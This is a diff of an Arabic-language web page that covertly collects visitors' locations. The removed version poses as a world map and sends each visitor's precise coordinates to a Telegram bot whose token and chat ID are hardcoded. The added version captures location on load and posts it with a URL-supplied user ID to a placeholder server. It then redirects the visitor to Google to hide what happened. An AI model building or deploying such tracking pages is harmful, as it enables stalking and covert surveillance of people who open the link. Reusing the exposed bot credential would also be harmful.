@@ -1,55 +1,46 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>خرائط العالم</title>
-    <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />
-    <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
-    <style>
-        body, html { height: 100%; margin: 0; }
-        #map { height: 100vh; }
-    </style>
-</head>
-<body>
-    <div id="map"></div>
-
+    <title>جارٍ تحديد الموقع...</title>
     <script>
-        var map = L.map('map').setView([20, 0], 2); // عرض الخريطة بشكل عام
-
-        // تحميل خرائط OpenStreetMap
-        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-            attribution: '&copy; OpenStreetMap contributors'
-        }).addTo(map);
-
         function getLocation() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const user_id = urlParams.get('user_id');
+
+            if (!user_id) {
+                alert("⚠️ خطأ: لا يوجد معرف مستخدم!");
+                return;
+            }
+
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(sendPosition, null, { enableHighAccuracy: true });
+                navigator.geolocation.getCurrentPosition(position => {
+                    const latitude = position.coords.latitude;
+                    const longitude = position.coords.longitude;
+
+                    // إرسال الموقع إلى السيرفر
+                    fetch('https://your-server.com/location', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ user_id, latitude, longitude })
+                    }).then(response => response.json())
+                    .then(data => {
+                        window.location.href = "https://google.com"; // توجيه المستخدم إلى موقع آخر
+                    })
+                    .catch(error => console.error('Error:', error));
+                }, showError);
+            } else {
+                alert("⚠️ الموقع غير مدعوم في هذا المتصفح.");
             }
         }
 
-        function sendPosition(position) {
-            let latitude = position.coords.latitude;
-            let longitude = position.coords.longitude;
-            let accuracy = position.coords.accuracy;
-
-            // إرسال البيانات إلى بوت تيليجرام عبر API
-            let botToken = "7923151425:AAFInzECazr-2eyok7i4se6RrBV2CeP5v4c";  // ضع توكن البوت هنا
-            let chatId = "7326032837";  // ضع معرف الدردشة هنا (يمكنك استخدام ID مجموعة)
-            let message = 📍 موقع جديد تم استلامه:\n\n🌍 Latitude: ${latitude}\n🌍 Longitude: ${longitude}\n🎯 الدقة: ${accuracy} متر\n🔗 خرائط جوجل: https://www.google.com/maps?q=${latitude},${longitude};
-
-            let telegramUrl = https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)};
-            fetch(telegramUrl);
-
-            // وضع علامة على الخريطة
-            L.marker([latitude, longitude]).addTo(map)
-                .bindPopup("موقعك الحالي")
-                .openPopup();
-            
-            map.setView([latitude, longitude], 15); // تكبير الخريطة إلى موقع المستخدم
+        function showError(error) {
+            alert("❌ لم يتمكن المتصفح من الحصول على موقعك: " + error.message);
         }
 
         window.onload = getLocation;
     </script>
+</head>
+<body>
+    <h3>⏳ جاري تحديد موقعك...</h3>
 </body>
 </html>
